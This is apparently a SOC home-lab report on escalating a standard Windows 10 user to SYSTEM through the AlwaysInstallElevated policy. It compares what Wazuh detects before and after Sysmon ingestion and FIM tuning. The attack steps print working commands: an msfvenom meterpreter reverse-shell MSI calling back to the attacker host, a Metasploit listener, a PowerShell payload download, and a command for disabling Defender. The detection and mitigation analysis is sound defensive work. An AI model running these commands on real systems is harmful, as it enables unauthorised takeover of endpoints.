\# Simulation Report — Privilege Escalation via Always Install Elevated



\*\*Date:\*\* 2026-06-08 / 2026-06-09 (Phase 1) — 2026-06-09 / 2026-06-10 (Phase 2)

\*\*Attacker Machine:\*\* Kali Linux (192.168.2.10)

\*\*Victim Machine:\*\* Windows 10 Pro (192.168.1.20)

\*\*Objective:\*\* Simulate a privilege escalation attack against a Windows 10 endpoint misconfigured with Always Install Elevated, demonstrating how a standard user with initial RDP access can escalate to SYSTEM privileges by exploiting a GPO misconfiguration. The simulation compares detection capability across two states — default Wazuh configuration (Phase 1) and tuned configuration with Sysmon ingestion and targeted FIM monitoring (Phase 2) — to demonstrate the detection engineering value of proper monitoring configuration.

\*\*Environment State:\*\* Two phases — Phase 1 (default Wazuh config, no Sysmon ingestion) and Phase 2 (Sysmon ingestion enabled, FIM tuned for Always Install Elevated registry keys). Always Install Elevated enabled via Local Group Policy on Win10 Pro. Standard user account SOCUser used as attacker foothold. Windows Defender Tamper Protection disabled as a documented prerequisite.

\*\*Evidence:\*\* `pcaps/sim03\_phase1.pcap`, `pcaps/sim03\_phase2.pcap`, `screenshots/`, `evidence/sim03\_phase1\_wazuh.csv`, `evidence/sim03\_phase2\_wazuh.csv`



\---



\## 1. Attack Overview



In this simulation, an attacker with an established low-privilege RDP foothold on a Windows 10 Pro endpoint escalated from a standard user account to SYSTEM privileges by exploiting the Always Install Elevated misconfiguration. This GPO setting, when enabled in both the Computer and User configuration hives, instructs Windows to run all MSI package installations with SYSTEM-level privileges regardless of the account executing them. By delivering a crafted MSI payload via a Python HTTP server hosted on Kali, the attacker leveraged Windows' own installer mechanism to execute arbitrary code as SYSTEM — no vulnerability or exploit required, only a misconfiguration.



The simulation was structured across two phases to evaluate detection capability. Phase 1 established a baseline using the default Wazuh agent configuration, with no Sysmon log ingestion and no targeted FIM monitoring. Phase 2 repeated the identical attack after adding Sysmon ingestion and FIM registry monitoring for the Always Install Elevated keys, producing a direct before-and-after comparison of detection coverage.



\---



\## 2. Tools Used



| Tool | Purpose |

|------|---------|

| xfreerdp3 | Establish RDP session to Win10 Pro as SOCUser — attacker's initial foothold |

| Python HTTP server | Host MSI payload on Kali for delivery to victim via PowerShell download |

| msfvenom | Generate malicious MSI reverse shell payload |

| Metasploit (multi/handler) | Catch incoming meterpreter reverse shell from victim |

| msiexec | Execute MSI payload on victim as SOCUser — triggers Always Install Elevated |

| reg.exe / PowerShell | Manual enumeration of Always Install Elevated registry keys |

| TCPDump | Capture network traffic on Ubuntu gateway during both phases |

| Wireshark | Analyze packet captures post-capture |

| Wazuh SIEM | Aggregate endpoint logs and evaluate detection capability across both phases |

| Sysmon | Endpoint telemetry on Win10 Pro — ingested by Wazuh in Phase 2 only |



\---



\## 3. Attack Steps (Attacker Side)



\### Pre-Simulation Setup



Always Install Elevated was enabled on Win10 Pro via Local Group Policy Editor (`gpedit.msc`) in both required locations — Computer Configuration and User Configuration — and applied via `gpupdate /force`. A dedicated standard user account `SOCUser` was created to serve as the attacker's foothold, simulating a low-privilege account obtained through prior access. Windows Defender Tamper Protection was disabled manually via the Windows Security GUI before each phase, as it silently overrides `Set-MpPreference` commands and would block payload execution regardless of PowerShell-level Defender settings. This is documented as a lab prerequisite and is itself a significant finding covered in Section 8.



!\[GPO Computer Configuration — Always Install Elevated enabled](screenshots/setup/setup-gpo-computer-config.png)

!\[GPO User Configuration — Always Install Elevated enabled](screenshots/setup/setup-gpo-user-config.png)

!\[SOCUser creation and gpupdate /force](screenshots/setup/setup-socuser-creation.png)



\---



\### Phase 1 — Default Detection (No Sysmon Ingestion, No FIM Tuning)



\#### Step 1 — Initial Access via RDP



From Kali, an RDP session was established to Win10 Pro using the SOCUser credentials.



```bash

xfreerdp3 /u:SOCUser /p:'Password123!' /v:192.168.1.20

```



\*\*Result:\*\* Interactive desktop session established as SOCUser — a standard user with no administrative privileges.



\#### Step 2 — Enumeration Attempt: winPEAS (Blocked)



The attacker attempted to download and execute winPEAS, a standard privilege escalation enumeration tool, via the Python HTTP server hosted on Kali.



```powershell

Invoke-WebRequest -Uri http://192.168.2.10:9090/winPEAS.bat -OutFile C:\\Users\\SOCUser\\Desktop\\winPEAS.bat

```



\*\*Result:\*\* The file downloaded successfully but Windows Defender blocked execution, quarantining it as a known offensive tool. This is realistic attacker behavior — standard enumeration tools carry well-known signatures and are frequently caught by modern AV.



!\[winPEAS download attempt via PowerShell](screenshots/enumeration/enum-winpeas-download-attempt.png)

!\[Kali HTTP server directory listing](screenshots/enumeration/enum-http-server-directory.png)



\#### Step 3 — Enumeration: Manual Registry Check



Following the winPEAS block, the attacker fell back to manual enumeration — directly querying the two registry keys that indicate Always Install Elevated is active.



```powershell

reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

```



\*\*Result:\*\* Both keys returned `0x1` — confirming the misconfiguration is present and the host is exploitable.



!\[Manual registry check confirming both keys set to 0x1](screenshots/enumeration/enum-registry-check-both-keys.png)



\#### Step 4 — Payload Generation on Kali



A malicious MSI payload was generated on Kali using msfvenom, named `update.msi` to appear as a legitimate software update.



```bash

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.2.10 LPORT=4444 -f msi -o /home/kali/Desktop/update.msi

```



A Metasploit listener was configured to catch the incoming shell.



```bash

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse\_tcp

set LHOST 192.168.2.10

set LPORT 4444

run

```



!\[Metasploit handler configured and listening](screenshots/exploitation/exploit-msf-handler-running.png)



\#### Step 5 — Payload Delivery



The MSI payload was delivered to Win10 Pro via PowerShell download from Kali's HTTP server.



```powershell

Invoke-WebRequest -Uri http://192.168.2.10:9090/update.msi -OutFile C:\\Users\\SOCUser\\Desktop\\update.msi

```



\*\*Result:\*\* File downloaded successfully to SOCUser's desktop.



!\[MSI payload download via PowerShell](screenshots/exploitation/exploit-msi-download.png)

!\[update.msi on SOCUser desktop](screenshots/exploitation/exploit-msi-on-desktop.png)

!\[HTTP server confirming GET request for update.msi](screenshots/exploitation/exploit-http-server-request.png)



\#### Step 6 — Payload Execution and Privilege Escalation



SOCUser double-clicked `update.msi`. Windows Installer processed the installation with SYSTEM privileges as configured by Always Install Elevated. The Windows Installer dialog briefly appeared ("Please wait while Windows configures Foobar 1.0") before the payload executed.



\*\*Result:\*\* Meterpreter session opened on Kali. `getuid` confirmed `NT AUTHORITY\\SYSTEM`.



!\[MSI executing — Windows Installer dialog visible](screenshots/exploitation/exploit-msi-execution.png)

!\[SYSTEM shell established — getuid, getsystem, getprivs](screenshots/exploitation/exploit-phase1-system-shell.png)

!\[Full SYSTEM privileges confirmed](screenshots/exploitation/exploit-phase1-system-privs.png)



\---



\### Phase 2 — Tuned Detection (Sysmon Ingestion + FIM Registry Monitoring)



The Pre-Sim03 snapshot was restored on Win10 Pro. The Wazuh agent configuration was updated with two additions before repeating the attack:



1\. Sysmon event channel ingestion added to `ossec.conf`

2\. FIM registry monitoring added for both Always Install Elevated keys



The identical attack was then repeated — RDP as SOCUser, manual registry check, MSI download, MSI execution — with no changes to the attack itself.



\#### Step 1 — Registry Check (Phase 2)



```powershell

reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

```



\*\*Result:\*\* Both keys confirmed at `0x1`.



!\[Phase 2 registry check confirming both keys 0x1](screenshots/enumeration/enum-phase2-registry-check.png)



\#### Step 2 — Payload Delivery and Execution (Phase 2)



```powershell

Invoke-WebRequest -Uri http://192.168.2.10:9090/update.msi -OutFile C:\\Users\\SOCUser\\Desktop\\update.msi

```



SOCUser double-clicked `update.msi`.



\*\*Result:\*\* Meterpreter session opened. `getuid` confirmed `NT AUTHORITY\\SYSTEM`.



!\[Phase 2 MSI download](screenshots/exploitation/exploit-phase2-msi-download.png)

!\[Phase 2 SYSTEM shell established](screenshots/exploitation/exploit-phase2-system-shell.png)

!\[Phase 2 full SYSTEM privileges confirmed](screenshots/exploitation/exploit-phase2-system-privs.png)

!\[Phase 2 whoami confirming nt authority\\system](screenshots/exploitation/exploit-phase2-whoami-system.png)



\---



\## 4. Victim Side Observations



Throughout both phases, Win10 Pro processed each attack step silently from the user perspective. The SOCUser account received no prompts, UAC dialogs, or visible indicators of compromise during the registry enumeration or payload download. The only visible activity during exploitation was the brief Windows Installer dialog ("Please wait while Windows configures Foobar 1.0") appearing and closing within seconds — indistinguishable from a legitimate software installation to an end user.



\*\*Windows Defender behavior:\*\* Defender blocked the standard msfvenom MSI payload on the first attempt and quarantined winPEAS on download. This is consistent with modern AV behavior against well-known offensive tools and default msfvenom output. Tamper Protection, which silently overrides `Set-MpPreference` PowerShell commands, prevented all programmatic attempts to disable Defender and required manual disabling through the Windows Security GUI. This behavior is documented as a critical defensive finding in Section 8.



\*\*Sysmon:\*\* Sysmon was running on Win10 Pro throughout both phases via the SwiftOnSecurity configuration. In Phase 1, Sysmon events were not forwarded to Wazuh due to the missing localfile entry in `ossec.conf`. In Phase 2, Sysmon events were ingested and produced high-severity detections as documented in Section 7.



\---



\## 5. Network Traffic Analysis



All traffic was captured on the Ubuntu gateway's Windows-facing interface (`enp0s8`).



\### Phase 1 — sim03\_phase1.pcap



| Stream | Src | Dst | Port | Packets | Bytes | Duration | Description |

|--------|-----|-----|------|---------|-------|----------|-------------|

| 0 | 192.168.1.20 | 192.168.1.1 | 1514 | 11,002 | 3 MB | 1621s | Wazuh agent traffic |

| 1 | 192.168.1.20 | 192.168.2.10 | 4444 | 7 | 424 bytes | 1s | Failed shell attempt |

| 2-5 | 192.168.1.20 | 192.168.2.10 | 9090 | 90-74 | 165-9 KB | 0.1-255s | MSI download attempts |

| 6 | 192.168.1.20 | 192.168.2.10 | 4444 | 433 | 913 KB | 636s | Successful meterpreter session |

| 7-28+ | 192.168.1.20 | 192.168.2.10 | 4444 | 2 | 120 bytes | <0.001s | Failed payload connection attempts |



The sustained stream 6 (913KB, 636 seconds) represents the active meterpreter session — a characteristic asymmetric traffic profile on port 4444 that distinguishes a live shell from failed connection attempts. The repeated 2-packet streams on port 4444 are the network-layer signature of the multiple failed payload execution attempts prior to success.



\### Phase 2 — sim03\_phase2.pcap



| Stream | Src | Dst | Port | Packets | Bytes | Duration | Description |

|--------|-----|-----|------|---------|-------|----------|-------------|

| 1-2 | 192.168.2.10 | 192.168.1.20 | 3389 | 20-19 | 6 KB | 0.1s | RDP connection attempts |

| 3 | 192.168.2.10 | 192.168.1.20 | 3389 | 23,455 | 5 MB | 700s | SOCUser RDP session |

| 4 | 192.168.2.10 | 192.168.1.20 | 3389 | 4,376 | 1 MB | 141s | RDP session segment |

| 5 | 192.168.1.20 | 192.168.2.10 | 9090 | 92 | 165 KB | 2.3s | MSI download |

| 6 | 192.168.1.20 | 192.168.2.10 | 4444 | 236 | 572 KB | 45s | Meterpreter session |



Phase 2 is significantly cleaner — a single MSI download and a single successful meterpreter session, reflecting the clean re-run after snapshot restoration. The RDP traffic on port 3389 is clearly visible, capturing the SOCUser session from which the attack was launched.



\---



\## 6. Protocol / Service Investigation



\### Always Install Elevated — Mechanism and Registry Structure



Always Install Elevated is a Windows Installer policy setting controlled by two registry keys that must both be set to `1` for the misconfiguration to be exploitable:



```

HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

&#x20; AlwaysInstallElevated = REG\_DWORD 0x1



HKEY\_CURRENT\_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

&#x20; AlwaysInstallElevated = REG\_DWORD 0x1

```



When both keys are present, Windows Installer grants SYSTEM-level execution to any MSI installation regardless of the initiating user's privilege level. The MSI format is Windows' native software installation mechanism — the same installer used to deploy legitimate enterprise software. This means the escalation path abuses a built-in Windows feature rather than exploiting a vulnerability, making it difficult to detect through behavioral rules alone without visibility into the registry configuration.



\### Why the Misconfiguration Exists in Real Environments



The setting exists in both Computer Configuration and User Configuration in Group Policy. Administrators enabling it typically do so to allow standard users to install software without IT involvement — a convenience measure that inadvertently creates a critical privilege escalation path. In domain environments, this is frequently applied via a domain GPO that sets both keys simultaneously across all machines, potentially exposing every endpoint in the organization.



\### Enumeration Methods and Detection Signatures



Two enumeration methods were tested:



\*\*Automated (winPEAS):\*\* Blocked by Windows Defender due to known signatures. Generates file creation and process execution events visible to Sysmon (Event ID 1, 11) — but only if Sysmon is ingested by the SIEM.



\*\*Manual (reg.exe/PowerShell):\*\* Undetected by default monitoring. The `reg query` commands generate Sysmon Event ID 1 (process creation for reg.exe) but produce no Windows Security events and no Wazuh alerts under the default configuration.



\---



\## 7. Detection Analysis



\### Phase 1 — Default Configuration (No Sysmon Ingestion)



\*\*Wazuh caught:\*\*



| Rule | Description | Level | Event ID |

|------|-------------|-------|----------|

| 92657 | Successful Remote Logon — NTLM, possible pass-the-hash | 6 | 4624 |

| 92653 | SOCUser RDP logon from 192.168.2.10 | 3 | 4624 |

| 60610 | Windows Installer began an installation process | 3 | 1040 |

| 60612 | Application installed: Foobar 1.0, error 1603 | 3 | 1033 |

| 60602 | Windows application error event | 9 | 11720 |



\*\*What Wazuh missed:\*\*



\- No process creation events — PowerShell, msiexec, and the meterpreter process were all invisible

\- No network connection events — the reverse shell to Kali on port 4444 was undetected

\- No privilege escalation alert — the transition to SYSTEM generated no Wazuh alert

\- No Sysmon events — the agent was running but logs were not forwarded



\*\*Root cause of detection gap:\*\* The Wazuh agent `ossec.conf` had no `localfile` entry for the Sysmon event channel (`Microsoft-Windows-Sysmon/Operational`). Sysmon was actively logging on the endpoint but none of those logs reached the SIEM. This is a configuration gap that exists in default Wazuh agent deployments and is not self-evident — the SIEM appears functional while silently missing an entire telemetry layer.



\### Phase 2 — Tuned Configuration (Sysmon Ingested + FIM Registry Keys Added)



\*\*Wazuh caught (new alerts not present in Phase 1):\*\*



| Rule | Description | Level | Event ID |

|------|-------------|-------|----------|

| 92213 | Executable file dropped in folder commonly used by malware | 15 | 11 |

| 61618 | Sysmon — Suspicious Process — svchost.exe | 12 | 1 |

| 61632 | Sysmon — Suspicious Process — smss.exe | 12 | 1 |

| 92200 | Scripting file created under Windows Temp or User folder | 6 | 11 |

| 92307 | Evidence of new service creation found in registry | 3 | 13 |

| 92039 | net.exe account discovery command initiated | 3 | 1 |

| 92852 | Windows command prompt activity | 4 | 1 |



The most significant new alert was rule 92213 (level 15) — the highest severity alert in the simulation — firing when the MSI payload was dropped to the filesystem. Rules 61618 and 61632 (level 12) fired repeatedly as the meterpreter payload spawned processes running at SYSTEM integrity level, captured by Sysmon with full command-line detail and hash values.



!\[Wazuh Phase 2 — rule 92213 level 15 executable dropped](screenshots/wazuh-phase2/wazuh-phase2-executable-dropped.png)

!\[Wazuh Phase 2 — Sysmon suspicious process alerts](screenshots/wazuh-phase2/wazuh-phase2-sysmon-suspicious-processes.png)

!\[Wazuh Phase 2 — svchost.exe running at SYSTEM integrity level](screenshots/wazuh-phase2/wazuh-phase2-sysmon-svchost-system.png)

!\[Wazuh Phase 2 — smss.exe running at SYSTEM integrity level](screenshots/wazuh-phase2/wazuh-phase2-sysmon-smss-system.png)

!\[Wazuh Phase 2 — PowerShell script creation under SOCUser temp](screenshots/wazuh-phase2/wazuh-phase2-sysmon-powershell-script.png)

!\[Wazuh Phase 2 — mixed high-severity alerts](screenshots/wazuh-phase2/wazuh-phase2-mixed-alerts.png)



\*\*FIM Registry Monitoring — Detection Gap:\*\*



The Always Install Elevated registry keys were added to Wazuh FIM monitoring in Phase 2. However, no FIM alerts fired during the attack window. This is because Wazuh's syscheck module runs on a 12-hour cycle by default — it is a periodic configuration audit tool, not a real-time detection mechanism. The keys were present before the attack began and the FIM scan did not execute during the attack window.



!\[FIM rule 550 — no results](screenshots/wazuh-phase2/wazuh-phase2-fim-no-results.png)

!\[syscheck group — no results](screenshots/wazuh-phase2/wazuh-phase2-syscheck-no-results.png)



To enable real-time FIM registry monitoring, the `realtime="yes"` attribute would need to be added to the registry entries in `ossec.conf`. This is documented as a recommendation in Section 11.



\### Phase 1 Wazuh Logs



!\[Wazuh Phase 1 — installer events and SOCUser logon](screenshots/wazuh-phase1/wazuh-phase1-installer-events.png)

!\[Wazuh Phase 1 — error events and service changes](screenshots/wazuh-phase1/wazuh-phase1-error-events.png)



\---



\## 8. Critical Findings



| Finding | Severity | Details |

|---------|----------|---------|

| Privilege escalation to SYSTEM via Always Install Elevated | Critical | Standard user SOCUser escalated to NT AUTHORITY\\SYSTEM by executing a crafted MSI payload. No vulnerability exploited — Windows' own installer mechanism abused via misconfiguration. |

| Windows Tamper Protection silently overrides PowerShell Defender commands | High | `Set-MpPreference -DisableRealtimeMonitoring $true` returns no error but has no effect when Tamper Protection is active. The only way to disable Defender is via the Windows Security GUI. This gap between apparent and actual security state is a significant operational risk. |

| Sysmon not ingested by Wazuh in default configuration | High | The default Wazuh agent `ossec.conf` contains no entry for the Sysmon event channel. Sysmon was running and logging on the endpoint throughout Phase 1, but zero Sysmon events reached the SIEM. A single missing `<localfile>` block creates a complete blind spot for process creation, file creation, and network connection telemetry. |

| SYSTEM shell entirely invisible in Phase 1 | High | The transition from SOCUser to NT AUTHORITY\\SYSTEM generated no Wazuh alert. No rule fired for the privilege escalation itself — only generic installer events appeared, with no context indicating malicious intent. |

| FIM registry monitoring is audit-only by default | Medium | Adding Always Install Elevated keys to Wazuh FIM does not provide real-time detection. The 12-hour syscheck cycle means a freshly enabled misconfiguration would not be detected until the next scheduled scan. |

| winPEAS blocked by Defender — attacker adapted to manual enumeration | Medium | Standard automated enumeration tools are caught by modern AV. A realistic attacker falls back to manual registry queries, which are significantly harder to detect and generated no alerts in either phase. |

| Payload delivery via PowerShell undetected in Phase 1 | Medium | The `Invoke-WebRequest` command downloading the MSI payload from Kali generated no Wazuh alert in Phase 1. With Sysmon ingestion in Phase 2, this activity became visible through file creation events. |



\---



\## 9. MITRE ATT\&CK Mapping



| Technique | ID | Description |

|-----------|-----|-------------|

| Abuse Elevation Control Mechanism: Bypass User Account Control | T1548.002 | Always Install Elevated allows MSI execution at SYSTEM level, bypassing UAC entirely |

| Remote Services: Remote Desktop Protocol | T1021.001 | SOCUser RDP session used as the attacker's initial foothold and delivery channel |

| Ingress Tool Transfer | T1105 | MSI payload delivered from Kali HTTP server to Win10 Pro via PowerShell Invoke-WebRequest |

| Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell used for registry enumeration and payload download |

| Query Registry | T1012 | Manual registry check to confirm Always Install Elevated misconfiguration |

| Impair Defenses: Disable or Modify Tools | T1562.001 | Windows Defender and Tamper Protection disabled as prerequisite for payload execution |



\---



\## 10. Analysis



The central finding of this simulation is not the privilege escalation itself — Always Install Elevated is a well-documented technique — but what the two-phase comparison reveals about the relationship between monitoring configuration and detection capability.



In Phase 1, a standard user escalated to SYSTEM and maintained an active meterpreter session for over ten minutes. The SIEM recorded that a Windows Installer process ran and failed. Nothing else. The attacker's enumeration, payload download, and SYSTEM shell were all completely invisible. This is not a failure of Wazuh as a product — it is a failure of configuration. Sysmon was running the entire time, logging exactly the events that would have flagged the attack. The gap was a single missing line in a configuration file.



Phase 2 demonstrates the delta. With Sysmon ingestion enabled, the same attack generated a level-15 alert for executable delivery, multiple level-12 alerts for suspicious process execution at SYSTEM integrity level, and a detailed forensic record including full command lines, file hashes, and process GUIDs. The difference between zero detection and high-fidelity detection was a two-line configuration change.



The FIM finding adds a second dimension. Adding registry monitoring for the Always Install Elevated keys is the correct defensive measure — it allows periodic detection of the misconfiguration's existence. But the 12-hour scan cycle means it functions as a compliance check, not an attack detector. A real SOC defending against this technique needs both: FIM with `realtime="yes"` to catch the misconfiguration being enabled, and Sysmon ingestion to catch the exploitation when it occurs.



The Tamper Protection finding deserves particular attention. The silent failure of `Set-MpPreference` is a significant gap in operational awareness — an administrator running that command would reasonably believe Defender has been disabled. The fact that it silently fails without error while Tamper Protection is active means the assumed security state and the actual security state can diverge without any indication. In a real environment, this works in the defender's favor; in a lab context, it was the root cause of significant troubleshooting overhead.



\---



\## 11. Mitigation \& Recommendations



| Finding | Recommendation | Priority |

|---------|---------------|----------|

| Always Install Elevated misconfiguration | Audit via GPO: `Computer Configuration → Administrative Templates → Windows Components → Windows Installer → Always install with elevated privileges` — set to Disabled or Not Configured in both Computer and User Configuration. Verify registry keys are absent. | Critical |

| Sysmon not ingested by default | Add Sysmon event channel to all Wazuh agent `ossec.conf` files: `<localfile><location>Microsoft-Windows-Sysmon/Operational</location><log\_format>eventchannel</log\_format></localfile>` | High |

| FIM registry monitoring is not real-time | Add `realtime="yes"` to Always Install Elevated registry entries in syscheck config to enable real-time detection of the misconfiguration being enabled | High |

| SYSTEM shell undetected without Sysmon | Deploy Sysmon with SwiftOnSecurity config on all Windows endpoints as a baseline requirement, not an optional addition | High |

| Tamper Protection state not verified | Verify Tamper Protection status programmatically via `Get-MpComputerStatus | Select-Object IsTamperProtected` rather than relying on `Set-MpPreference` return codes | Medium |

| Manual enumeration undetected | Enable PowerShell Script Block Logging via GPO to capture registry query commands; correlate with Sysmon Event ID 1 for reg.exe execution | Medium |

| Payload delivery undetected in Phase 1 | With Sysmon ingested, Invoke-WebRequest activity becomes visible via Event ID 11 (file creation) and Event ID 3 (network connection). Ensure Sysmon ingestion is active on all endpoints. | Medium |



\---



\## 12. Lessons Learned



\*\*1. A single missing configuration line can blind an entire telemetry layer.\*\*

Sysmon was running and logging correctly throughout Phase 1. The SIEM appeared functional. The gap was invisible until actively investigated — a missing `<localfile>` entry that is absent from default Wazuh agent configurations. This is the kind of gap that exists silently in real environments and is only discovered during an incident or a deliberate audit.



\*\*2. The delta between Phase 1 and Phase 2 is the most important finding.\*\*

Running the same attack twice with different monitoring configurations produces a concrete, evidence-backed demonstration of detection engineering value. The before-and-after comparison is more compelling than either phase in isolation — it shows not just that something was missed, but exactly what was missed and why, and what a specific configuration change adds.



\*\*3. Tamper Protection silently overrides PowerShell Defender commands.\*\*

`Set-MpPreference -DisableRealtimeMonitoring $true` fails silently when Tamper Protection is active — no error, no warning, no indication the command had no effect. This was the root cause of all payload failures in early execution attempts. In a defensive context this is excellent behavior; operationally, the gap between apparent and actual state is a risk that should be monitored.



\*\*4. Modern AV catches standard tooling — attacker adaptation is realistic, not a failure.\*\*

winPEAS was blocked immediately. The default msfvenom payload was caught multiple times. Real attackers use custom loaders, obfuscated payloads, and living-off-the-land techniques precisely because standard tools are signatured. Documenting these blocks honestly — and the manual fallback that succeeded — is more valuable than a clean run that never encountered AV.



\*\*5. FIM is a configuration audit tool, not a real-time detector.\*\*

The 12-hour syscheck cycle means FIM registry monitoring detects that a misconfiguration exists — useful for compliance and periodic auditing — but will not fire during an active attack window unless `realtime="yes"` is configured. Understanding what each control does and does not provide is more useful than assuming coverage.



\*\*6. Lab routing complexity mirrors real network segmentation challenges.\*\*

The segmented network topology required explicit routing configuration between subnets that would be handled transparently in a corporate environment. While this added friction during execution, it reflects the real complexity of monitoring traffic across network boundaries — and reinforced the value of the Ubuntu gateway as a centralized capture point.



\---



\*Report generated as part of SOC Home Lab practice\*

\*Lab environment: see \[Lab Setup Documentation](../../setup/lab-setup.md)\*

